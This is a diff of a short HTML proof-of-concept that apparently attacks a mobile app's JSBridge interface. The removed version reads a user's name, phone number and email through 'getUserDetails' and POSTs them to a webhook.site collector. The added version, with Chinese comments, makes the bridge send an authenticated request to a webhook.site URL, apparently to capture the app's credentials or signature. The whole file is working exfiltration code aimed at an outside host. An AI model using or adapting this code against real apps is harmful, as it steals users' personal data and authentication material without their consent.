@@ -1,22 +1,11 @@
+<!-- simple.html -->
 <script>
-  JSBridge.call('getUserDetails', {}, function(response) {
-    try {
-      var userData = JSON.parse(response.user_details);
-      fetch('https://webhook.site/YOUR-UNIQUE-ID', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-          name: userData.name,
-          phone: userData.phone_number,
-          email: userData.email_id,
-          source: 'district_poc'
-        })
-      });
-    } catch(e) {
-      fetch('https://webhook.site/YOUR-UNIQUE-ID', {
-        method: 'POST',
-        body: 'Error: ' + e.toString()
-      });
-    }
+  // 尝试发起一个带签名的 GET 请求（URL 指向 webhook.site）
+  JSBridge.call('httpRequest', {
+    method: 'GET',
+    url: 'https://webhook.site/8dd3d2c8-6e93-4e10-92df-de8a2bb70519',  // ← 替换成你的 webhook URL
+    authentication: { is_authenticated: true }
+  }, function(response) {
+    console.log("Done:", response);
   });
 </script>
